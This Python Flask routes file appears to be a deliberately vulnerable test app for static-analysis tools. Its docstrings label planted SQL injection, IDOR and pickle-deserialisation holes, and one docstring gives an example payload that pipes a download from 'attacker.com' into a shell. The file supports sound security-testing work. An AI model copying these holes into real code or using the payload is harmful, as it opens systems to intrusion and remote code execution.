"""
app/users.py
User management routes: search, profile, preferences.
"""
import pickle
import base64
from flask import Blueprint, request, jsonify, g
from db.database import execute_query, execute_raw
from app.utils import weak_sanitize, log_action
from app.middleware import require_auth

users_bp = Blueprint("users", __name__, url_prefix="/users")


@users_bp.route("/search")
@require_auth
def search_users():
    """
    ── V-02: CWE-89 SQL Injection (cross-file taint, two hops) ──────────────
    Taint chain:
      request.args["q"]          (source, this file)
      → weak_sanitize(q)         (utils.py — strips ' but not ")
      → "...WHERE username LIKE '%" + q_clean + "%'"  (SQL built here)
      → execute_raw(sql)         (database.py — raw execution)
    CodeQL/DL both see this: the value flows from HTTP param through a
    helper function that does not fully sanitize before DB execution.
    """
    q       = request.args.get("q", "")
    q_clean = weak_sanitize(q)                  # false sense of safety
    sql     = f"SELECT id, username, email FROM users WHERE username LIKE '%{q_clean}%'"
    rows    = execute_raw(sql)                   # sink in database.py
    return jsonify([dict(r) for r in rows])


@users_bp.route("/profile/<int:user_id>")
@require_auth
def get_profile(user_id: int):
    """
    ── V-15: CWE-639 Insecure Direct Object Reference ────────────────────────
    user_id comes from the URL path. The endpoint does not verify that
    g.user_id == user_id (or that the caller is admin), so any authenticated
    user can read any other user's profile by changing the path parameter.
    """
    # ← VULNERABLE: no ownership check
    rows = execute_query("SELECT id, username, email, balance FROM users WHERE id = ?", (user_id,))
    if not rows:
        return jsonify({"error": "Not found"}), 404
    return jsonify(dict(rows[0]))


@users_bp.route("/preferences", methods=["POST"])
@require_auth
def set_preferences():
    """
    ── V-07: CWE-502 Deserialization of Untrusted Data ──────────────────────
    User sends a base64-encoded pickle blob as their "preferences".
    pickle.loads() executes arbitrary Python code embedded in the payload.
    Exploit: craft a pickle that runs os.system('curl attacker.com | sh').
    """
    data  = request.get_json(force=True)
    prefs_b64 = data.get("preferences", "")
    # ← VULNERABLE: deserializing user-controlled data with pickle
    prefs = pickle.loads(base64.b64decode(prefs_b64))
    log_action(g.user_id, "set_preferences", f"keys={list(prefs.keys())}")
    return jsonify({"status": "saved", "keys": list(prefs.keys())})


@users_bp.route("/profile/me")
@require_auth
def get_my_profile():
    """SAFE: uses g.user_id set by auth middleware — no IDOR possible."""
    rows = execute_query(
        "SELECT id, username, email, balance FROM users WHERE id = ?",
        (g.user_id,),
    )
    return jsonify(dict(rows[0])) if rows else (jsonify({"error": "Not found"}), 404)
